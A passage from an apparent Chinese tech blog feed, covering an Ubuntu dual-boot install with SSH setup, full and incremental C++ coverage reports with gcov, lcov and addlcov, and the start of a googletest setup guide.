        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0-情景导入"><a class="markdownIt-Anchor" href="#0-情景导入"></a> 0 情景导入</h1><ol><li>宿舍中闲置一台华硕电脑，为充分利用资源，装上Ubuntu系统(20.04)；</li><li>搭建开发环境，练习远程开发；</li><li>目前在局域网中即可满足需求，后续可能配置内网穿透。</li></ol><h1 id="1-制作启动u盘"><a class="markdownIt-Anchor" href="#1-制作启动u盘"></a> 1 制作启动U盘</h1><h2 id="11-准备工具"><a class="markdownIt-Anchor" href="#11-准备工具"></a> 1.1 准备工具</h2><ul><li>4G以上的U盘</li><li>启动U盘制作工具：Ubuntu官方推荐的<a href="https://rufus.ie/zh/" target="_blank" rel="noopener">Rufus</a></li><li>Ubuntu系统镜像：<a href="https://ubuntu.com/" target="_blank" rel="noopener">官网</a>；（清华源下载速度快）</li></ul><h2 id="12-制作u盘"><a class="markdownIt-Anchor" href="#12-制作u盘"></a> 1.2 制作U盘</h2><p>运行Rufus，一般情况下，选择插入的U盘<code>设备</code>，和刚下载的Ubuntu<code>镜像</code>，其它保持默认即可开始U盘制作，等待制作完成即可。</p><img src="https://i.loli.net/2021/10/16/X7ljH8y4WbkhcUG.png" width="500" height="600" alt="图片名称" align="center" id="20"><h1 id="2-磁盘分区"><a class="markdownIt-Anchor" href="#2-磁盘分区"></a> 2 磁盘分区</h1><ol><li>打开<code>控制面板</code>，找到<code>磁盘管理</code>；</li><li>如果整个卷都用于磁盘分区，则<code>删除卷</code>，否则需要<code>压缩卷</code>，出现下面的<code>未分配</code>即可使用：</li></ol><blockquote><ul><li>删除卷的话并不是抹除这部分空间，只是这部分空间会被系统保留出来，没有任何文件格式，对于这部分空间系统不会进行任何操作。它相当于一个无人区。</li><li>压缩卷就是把一个盘里面的空间抽出一部分变成一个没有任何文件格式和名称的盘，你接下来要对压缩出来的盘进行格式化操作，这样压缩出来的卷才可以用。</li></ul></blockquote><img src="https://i.loli.net/2021/10/16/Y21WZODa7ynNouL.png" width="900" height="300" alt="图片名称" align="center" id="21"><h1 id="3-安装ubuntu"><a class="markdownIt-Anchor" href="#3-安装ubuntu"></a> 3 安装Ubuntu</h1><h2 id="31-u盘启动"><a class="markdownIt-Anchor" href="#31-u盘启动"></a> 3.1 U盘启动</h2><ol><li>将制作好的启动U盘插入到闲置电脑，重启(开机)按<code>F2</code>键进入BIOS界面；（进入BIOS需要按的键每个品牌的电脑不同）</li><li>在<code>Boot Priority</code>栏，将<code>UEFI:***</code>选项拖到开始，使其开机启动进入U盘；</li><li>保存修改退出即可，一会儿自动重启。</li></ol><h2 id="32-安装系统"><a class="markdownIt-Anchor" href="#32-安装系统"></a> 3.2 安装系统</h2><ol><li><p>从U盘启动后，在启动引导页选择<code>安装Ubuntu</code>进入Ubuntu；</p></li><li><p>一路默认选项，直到<code>Installation type</code>选择<code>Something else</code>，进入分区配置页面，找到<code>free space</code>，也就是在Windows系统中整好的磁盘分区；</p><table><thead><tr><th style="text-align:center">分区</th><th style="text-align:center">分区类型</th><th style="text-align:center">分区位置</th><th style="text-align:center">用于</th><th style="text-align:center">挂载点</th><th style="text-align:center">大小</th></tr></thead><tbody><tr><td style="text-align:center">boot(启动分区)</td><td style="text-align:center">主分区</td><td style="text-align:center">起始</td><td style="text-align:center">ext4文件系统</td><td style="text-align:center">/boot</td><td style="text-align:center">1G-2G</td></tr><tr><td style="text-align:center">swap(交换空间)</td><td style="text-align:center">逻辑分区</td><td style="text-align:center">起始</td><td style="text-align:center">交换分区</td><td style="text-align:center">无</td><td style="text-align:center">与物理内存一致</td></tr><tr><td style="text-align:center">/</td><td style="text-align:center">主分区</td><td style="text-align:center">起始</td><td style="text-align:center">ext4文件系统</td><td style="text-align:center">/</td><td style="text-align:center">剩余的空间</td></tr></tbody></table><blockquote><p>只有<code>/</code>是必须分区的，其它如果没有必要都不建议建议独立分区，按默认挂在root下就行。</p></blockquote></li><li><p>点击下一步完成后续安装即可正确安装Ubuntu。</p></li><li><p>拔出U盘，重启即可使用双系统。</p></li></ol><h1 id="4-配置ubuntu"><a class="markdownIt-Anchor" href="#4-配置ubuntu"></a> 4 配置Ubuntu</h1><h2 id="41-apt换源并安装必要软件"><a class="markdownIt-Anchor" href="#41-apt换源并安装必要软件"></a> 4.1 apt换源并安装必要软件</h2><ol><li><p>点击<code>Settings</code> -&gt; <code>About</code> -&gt; <code>Software Updates</code>，选择合适的镜像；</p></li><li><p>安装必要软件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vim</span><br><span class="line">sudo apt install net-tools</span><br><span class="line">sudo apt install make</span><br><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure></li></ol><h2 id="42-科学上网"><a class="markdownIt-Anchor" href="#42-科学上网"></a> * 4.2 科学上网</h2><h2 id="43-配置oh-my-zsh"><a class="markdownIt-Anchor" href="#43-配置oh-my-zsh"></a> 4.3 配置oh-my-zsh</h2><p>参考<code>Win10安装Ubuntu子系统</code></p><h2 id="44-xshell连接"><a class="markdownIt-Anchor" href="#44-xshell连接"></a> 4.4 xshell连接</h2><ol><li><p>使用xshell连接，被拒绝<code>(port 22): Connection failed</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看服务器22端口是否启动</span></span><br><span class="line">lsof -i:22</span><br><span class="line"><span class="comment"># 若没启动</span></span><br><span class="line">sudo apt-get install openssh-server openssh-client </span><br><span class="line"><span class="comment"># 开启ssh</span></span><br><span class="line">service ssh start</span><br><span class="line">ssh localhost</span><br><span class="line"><span class="comment"># 此时检查22是否启动</span></span><br><span class="line">lsof -i:22</span><br></pre></td></tr></table></figure></li><li><p>笔记本设置合盖不休眠：修改Login Manager配置文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/systemd/logind.conf</span><br><span class="line"><span class="comment">### 修改 ###</span></span><br><span class="line"><span class="comment"># 找到其中一行：</span></span><br><span class="line"><span class="comment">#HandleLidSwitch=suspend</span></span><br><span class="line"><span class="comment"># 将其改为：</span></span><br><span class="line">HandleLidSwitch=ignore</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务：重启计算机即可</span></span><br><span class="line">sudo restart systemd-logind  </span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">service systemd-logind restart</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">sudo shutdown -r now</span><br></pre></td></tr></table></figure></li></ol><h1 id="45-查看硬件配置"><a class="markdownIt-Anchor" href="#45-查看硬件配置"></a> 4.5 查看硬件配置</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统内核</span></span><br><span class="line">uname -a</span><br><span class="line"><span class="comment"># 查看CPU</span></span><br><span class="line">cat /proc/cpuinfo | grep model\ name</span><br><span class="line"><span class="comment"># 查看内存</span></span><br><span class="line">cat /proc/meminfo | grep MemTotal</span><br><span class="line"><span class="comment"># 查看显卡</span></span><br><span class="line">lspci | grep <span class="string">'VGA'</span></span><br><span class="line"><span class="comment"># 查看声卡</span></span><br><span class="line">lspci | grep -i <span class="string">'Audio'</span></span><br><span class="line"><span class="comment"># 查看网卡</span></span><br><span class="line">lspci | grep -i <span class="string">'Network'</span></span><br><span class="line"><span class="comment"># 查看硬盘</span></span><br><span class="line">df -lh</span><br></pre></td></tr></table></figure><h1 id="5-参考"><a class="markdownIt-Anchor" href="#5-参考"></a> 5 参考</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/101307629" target="_blank" rel="noopener">装了5次Ubuntu，告诉你win10+Ubuntu双系统的正确打开方式</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C++项目的全量覆盖率和增量覆盖率</title>
      <link href="/2021/09/27/C++%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%85%A8%E9%87%8F%E8%A6%86%E7%9B%96%E7%8E%87%E5%92%8C%E5%A2%9E%E9%87%8F%E8%A6%86%E7%9B%96%E7%8E%87/"/>
      <url>/2021/09/27/C++%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%85%A8%E9%87%8F%E8%A6%86%E7%9B%96%E7%8E%87%E5%92%8C%E5%A2%9E%E9%87%8F%E8%A6%86%E7%9B%96%E7%8E%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p><strong>需求</strong>：生成C/C++项目的全量/增量覆盖率报告</p><p><strong>方案</strong>：gcov+lcov+addlcov</p><blockquote><p><strong>gcov</strong>：是Linux下GCC自带的一个C/C++代码覆盖率分析工具,因此只要安装了gcc，就不需要再次安装了。</p></blockquote><hr><blockquote><p><strong>lcov</strong>：生成全量覆盖率报告。gcov能够生成代码覆盖信息，但是不够直观，因此需要借助lcov直观展示覆盖率，主要特点有：</p><ul><li>基于Html输出，并生成一棵完整的HTML树</li><li>输出包括概述、覆盖率百分比、图表，能快速浏览覆盖率数据</li><li>支持大项目，提供三个级别的视图：目录视图、文件视图、源码视图</li></ul></blockquote><hr><blockquote><p><strong>addlcov</strong>：生成全量覆盖率报告。</p></blockquote><h1 id="2-准备"><a class="markdownIt-Anchor" href="#2-准备"></a> 2 准备</h1><p>文件目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C++_project</span><br><span class="line">Version_A</span><br><span class="line">hello_world.cpp</span><br><span class="line">Version_B</span><br><span class="line">hello_world.cpp</span><br></pre></td></tr></table></figure><p><code>Version_A/hello_world.cpp</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Version_B/hello_world.cpp</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"func true"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"func false"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">func();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-安装"><a class="markdownIt-Anchor" href="#3-安装"></a> 3 安装</h1><ol><li><p><strong>gcov</strong>：安装gcc和g++即可；</p></li><li><p><strong>lcov</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Dragonliu2018/lcov.git</span><br><span class="line"><span class="built_in">cd</span> ./lcov</span><br><span class="line"><span class="comment"># 安装perl，否则可能出现报错</span></span><br><span class="line">apt-get install perl</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>在<code>./bin</code> 目录下生成了可执行文件 <code>lcov</code></p></li><li><p><strong>addlcov</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Dragonliu2018/addlcov.git</span><br></pre></td></tr></table></figure><p>将<code>addlcov</code>脚本放到项目文件夹直接使用即可。</p></li></ol><h1 id="4-全量覆盖率报告"><a class="markdownIt-Anchor" href="#4-全量覆盖率报告"></a> 4 全量覆盖率报告</h1><h2 id="41-lcov常用的参数"><a class="markdownIt-Anchor" href="#41-lcov常用的参数"></a> 4.1 lcov常用的参数</h2><ol><li><code>-d</code> 项目路径，即.gcda .gcno所在的路径</li><li><code>-a</code> 合并（归并）多个lcov生成的info文件</li><li><code>-c</code> 捕获，也即收集代码运行后所产生的统计计数信息</li><li><code>--external</code> 捕获其它目录产生的统计计数文件</li><li><code>-i/--initial</code> 初始化所有的覆盖率信息，作为基准数据</li><li><code>-o</code> 生成处理后的文件</li><li><code>-r/--remove</code> 移除不需要关注的覆盖率信息文件</li><li><code>-z</code> 重置所有执行程序所产生的统计信息为0</li></ol><h2 id="42-生成步骤"><a class="markdownIt-Anchor" href="#42-生成步骤"></a> 4.2 生成步骤</h2><p>以<code>Version_A/hello_world.cpp</code>为例：</p><ol><li><p><code>g++ -fprofile-arcs -ftest-coverage hello_world.cpp -o hello_world</code></p><ul><li>生成<code>hello_world</code> 和 <code>hello_world.gcno</code></li><li>编译时候加两个参数：<code>-fprofile-arcs -ftest-coverage</code>, 此时会生成： <code>hello_world.gcno</code></li></ul></li><li><p><code>./hello_world</code></p><ul><li>生成 <code>hello_world.gcda</code></li></ul></li><li><p><code>gcov hello_world.cpp</code></p><p>生成 <code>hello_world.cpp.gcov</code>，是代码覆盖信息，但看起来并不直观</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-:    0:Source:hello_world.cpp</span><br><span class="line">-:    0:Graph:hello_world.gcno</span><br><span class="line">-:    0:Data:hello_world.gcda</span><br><span class="line">-:    0:Runs:1</span><br><span class="line">-:    0:Programs:1</span><br><span class="line">-:    1:<span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line">-:    2:</span><br><span class="line">1:    3:int main()</span><br><span class="line">-:    4:&#123;</span><br><span class="line">1:    5:        <span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">1:    6:        <span class="built_in">return</span> 0;</span><br><span class="line">-:    7:&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>lcov -d . -t 'hello world' -o 'hello_world.info' -b . -c</code> (注意：如果提示lcov命令找不到，则使用lcov的绝对路径)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/drives/e/lcov/bin/lcov -d . -t <span class="string">'hello world'</span> -o <span class="string">'hello_world.info'</span> -b . -c</span><br></pre></td></tr></table></figure><p>借助lcov对<code>hello_world.cpp.gcov</code>进行改造，可以看见生成了<code>hello_world.info</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">TN:hello_world</span><br><span class="line">SF:/drives/e/10 temp/C++_project/Version_A/hello_world.cpp</span><br><span class="line">FN:3,main</span><br><span class="line">FNDA:1,main</span><br><span class="line">DA:3,1</span><br><span class="line">DA:5,1</span><br><span class="line">DA:6,1</span><br><span class="line">FNF:1</span><br><span class="line">FNH:1</span><br><span class="line">LF:3</span><br><span class="line">LH:3</span><br><span class="line">end_of_record</span><br></pre></td></tr></table></figure></li><li><p><code>genhtml -o result hello_world.info</code> (注意：如果提示genhtml命令找不到，则使用genhtml的绝对路径)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ /drives/e/lcov/bin/genhtml -o result hello_world.info</span><br><span class="line">Reading data file hello_world.info</span><br><span class="line">Found 1 entries.</span><br><span class="line">Found common filename prefix <span class="string">"/drives/e/10 temp/C++_project"</span></span><br><span class="line">Writing .css and .png files.</span><br><span class="line">Generating output.</span><br><span class="line">Processing file Version_A/hello_world.cpp</span><br><span class="line">Writing directory view page.</span><br><span class="line">Overall coverage rate:</span><br><span class="line">  lines......: 100.0% (3 of 3 lines)</span><br><span class="line">  <span class="built_in">functions</span>..: 100.0% (1 of 1 <span class="keyword">function</span>)</span><br></pre></td></tr></table></figure><p>生成了<code>result</code>文件夹，借助web服务器，结果直观</p><img src="https://s2.loli.net/2022/04/16/OR3lKZBv9F5tGAX.png" width="900" height="300" alt="图片名称" align="center" id="158"></li><li><p>用浏览器打开<code>index.html</code>：</p><img src="https://s2.loli.net/2022/04/16/nhQSp1a46MWjVGx.png" width="900" height="200" alt="图片名称" align="center" id="159"></li></ol><h1 id="5-增量覆盖率报告"><a class="markdownIt-Anchor" href="#5-增量覆盖率报告"></a> 5 增量覆盖率报告</h1><p>以<code>Version_A</code> 和 <code>Version_B</code> 为例：</p><h2 id="51-使用diff命令生成文件差异列表"><a class="markdownIt-Anchor" href="#51-使用diff命令生成文件差异列表"></a> 5.1 使用diff命令生成文件差异列表</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -r  -N -x <span class="string">".git"</span> -x <span class="string">"*.gcov"</span> -u &lt;old_src_path&gt; &lt;new_src_path&gt; &gt; diff.txt</span><br></pre></td></tr></table></figure><p>其中<code>&lt;old_src_path&gt;</code>是<code>Version_A</code> 版本代码路径、&lt;new_src_path&gt;是<code>Version_B</code> 版本代码路径，生成的diff.txt中包含的就是<code>Version_B</code> 相比<code>Version_A</code>的增量代码</p><p><strong>所以执行命令</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -r  -N -x <span class="string">"*.gc*"</span> -x <span class="string">"*.exe"</span> -x <span class="string">"result"</span> -u ./Version_A ./Version_B &gt; diff.txt</span><br></pre></td></tr></table></figure><p><code>diff.txt</code>中的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">--- ./Version_A/hello_world.cpp</span><br><span class="line">+++ ./Version_B/hello_world.cpp</span><br><span class="line">@@ -1,7 +1,17 @@</span><br><span class="line"> #include&lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">+void func()</span><br><span class="line">+&#123;</span><br><span class="line">+if (true) &#123;</span><br><span class="line">+printf(&quot;func true&quot;);</span><br><span class="line">+&#125; else &#123;</span><br><span class="line">+printf(&quot;func false&quot;);</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+ </span><br><span class="line"> int main()</span><br><span class="line"> &#123;</span><br><span class="line"> printf(&quot;hello world&quot;);</span><br><span class="line">+func();</span><br><span class="line"> return 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="52-使用addlcov生成增量代码覆盖率文件"><a class="markdownIt-Anchor" href="#52-使用addlcov生成增量代码覆盖率文件"></a> 5.2 使用addlcov生成增量代码覆盖率文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addlcov --diff &lt;full_cov_file&gt; diff.txt -o &lt;add_cov_file&gt; --strip &lt;depth&gt; --path &lt;new_src_path&gt;</span><br></pre></td></tr></table></figure><p>其中<code>&lt;full_cov_file</code>&gt;为之前统计的<code>Version_B</code>版本上的全量覆盖率；<code>&lt;add_cov_file&gt;</code>为输出的增量覆盖率info文件；<code>&lt;depth&gt;</code>是要截取的代码深度；<code>&lt;new_src_path&gt;</code>是<code>Version_B</code>版本源码</p><p>这里的<code>&lt;depth&gt;</code>再做一下解释：源码路径一般比较长，假设我们源码路径是<code>a/b/c/d/e</code>，这里的depth取值3则后续生成报告的根目录就是d了，前面三级就被屏蔽掉了。</p><p><strong>所以执行命令</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cur_version_dir=<span class="string">"/drives/e/10 temp/C++_project/Version_B"</span></span><br><span class="line"></span><br><span class="line">depth=$(<span class="built_in">echo</span> <span class="variable">$&#123;cur_version_dir&#125;</span> | sed -e <span class="string">'s/\/*$//g'</span> | awk -F<span class="string">"/"</span> <span class="string">'&#123;print NF&#125;'</span>)</span><br><span class="line"></span><br><span class="line">./addlcov --diff ./Version_B/hello_world.info diff.txt -o addhello_world.info  --strip <span class="variable">$&#123;depth&#125;</span> --path ./Version_B</span><br></pre></td></tr></table></figure><p><strong>出现报错</strong>：(单文件出现下述问题，多文件无问题)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BReading tracefile ./Version_B/hello_world.info</span><br><span class="line">Reading diff diff.txt</span><br><span class="line">Removing /drives/e/10 temp/C++_project/Version_B/hello_world.cpp</span><br><span class="line">1 entry converted, 0 entries left unchanged.</span><br><span class="line">Writing data to addhello_world.info</span><br><span class="line">Summary coverage rate:</span><br><span class="line">  lines......: no data found</span><br><span class="line">  <span class="built_in">functions</span>..: no data found</span><br><span class="line">  branches...: no data found</span><br></pre></td></tr></table></figure><p><strong>解决</strong>：<code>--path</code>后面的<code>&lt;new_src_path&gt;</code>路径要使用绝对路径</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ./addlcov --diff ./Version_B/hello_world.info diff.txt -o addhello_world.info  --strip <span class="variable">$&#123;depth&#125;</span> --path <span class="string">"/drives/e/10 temp/C++_project/Version_B"</span></span><br><span class="line"></span><br><span class="line">Reading tracefile ./Version_B/hello_world.info</span><br><span class="line">Reading diff diff.txt</span><br><span class="line">Converting /drives/e/10 temp/C++_project/Version_B/hello_world.cpp</span><br><span class="line">1 entry converted, 0 entries left unchanged.</span><br><span class="line">Writing data to addhello_world.info</span><br><span class="line">Summary coverage rate:</span><br><span class="line">  lines......: 100.0% (4 of 4 lines)</span><br><span class="line">  <span class="built_in">functions</span>..: 100.0% (2 of 2 <span class="built_in">functions</span>)</span><br><span class="line">  branches...: no data found</span><br></pre></td></tr></table></figure><h2 id="53-使用genhtml生成html格式的覆盖率报告"><a class="markdownIt-Anchor" href="#53-使用genhtml生成html格式的覆盖率报告"></a> 5.3 使用genhtml生成html格式的覆盖率报告</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genhtml -o &lt;report_dir&gt; &lt;add_cov_file&gt;</span><br></pre></td></tr></table></figure><p>其中<code>&lt;report_dir&gt;</code>是想要生成的报告路径名称，<code>&lt;add_cov_file&gt;</code>是通过上一步生成的覆盖率文件</p><p><strong>所以执行指令</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genhtml -o addresult addhello_world.info</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/04/16/NRMOznwGYim619k.png" width="900" height="300" alt="图片名称" align="center" id="160"><img src="https://s2.loli.net/2022/04/16/unjqov89Ic5yQ7b.png" width="900" height="300" alt="图片名称" align="center" id="161"><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://www.cnblogs.com/fnlingnzb-learner/p/6943512.html" target="_blank" rel="noopener">代码覆盖工具(gcov、lcov)的使用 </a></li><li><a href="https://www.jianshu.com/p/a42bbd9de1b7" target="_blank" rel="noopener">关于代码覆盖lcov的使用</a></li><li><a href="https://blog.csdn.net/Ls4034/article/details/72911389" target="_blank" rel="noopener">使用gcov生成增量覆盖率报告</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C++单元测试</title>
      <link href="/2021/09/27/C++%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"/>
      <url>/2021/09/27/C++%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0-情景导入"><a class="markdownIt-Anchor" href="#0-情景导入"></a> 0 情景导入</h1><p>在实习时，用到了C++中的单元测试，整理一下。分别在Windows和子系统（Ubuntu）中安装配置。</p><h1 id="1-安装googletest"><a class="markdownIt-Anchor" href="#1-安装googletest"></a> 1 安装googletest</h1><h2 id="11-环境配置"><a class="markdownIt-Anchor" href="#11-环境配置"></a> 1.1 环境配置</h2><ol><li><p>下载gtest：<code>git clone https://github.com/google/googletest.git</code></p></li><li><p>安装cmake：</p><blockquote><p>CMake 是一个开源的跨平台的自动化构建系统，主要用于 C++ 的工程构建、测试以及打包等自动化操作。它能根据开发者编写的 CMakeLists.txt 规则文件，在不同的平台输出所需要的工程文件，然后开发者可以按照常见的构建方式使用生成的工程文件编译最终的程序。</p><p>CMake 是 Cross platform Make 的缩写，虽然名字中含有“make”，但是 CMake 和 Linux 上常见的 make 系统有所区别，是更上一层的构建系统。</p></blockquote><ul><li><strong>Windows</strong>：首先打开 CMake 官方网站，在<a href="https://cmake.org/download/" target="_blank" rel="noopener">下载页面</a>选择 Windows win64-x64 Installer 下载并安装</li><li><strong>Ubuntu</strong>：<code>apt-get install cmake</code></li></ul></li><li><p>windows配置clion编译环境：<a href="https://www.jianshu.com/p/1aa989808e15" target="_blank" rel="noopener">Window10上CLion极简配置教程</a></p></li></ol><h2 id="12-编译gtest库"><a class="markdownIt-Anchor" href="#12-编译gtest库"></a> 1.2 编译gtest库</h2><ol><li><p>使用clion打开<code>googletest</code>代码目录，选择<code>gtest</code>项目编译生成：</p><img src="https://i.loli.net/2021/10/06/quPZfVpBdWGCriI.png" width="800" height="300" alt="图片名称" 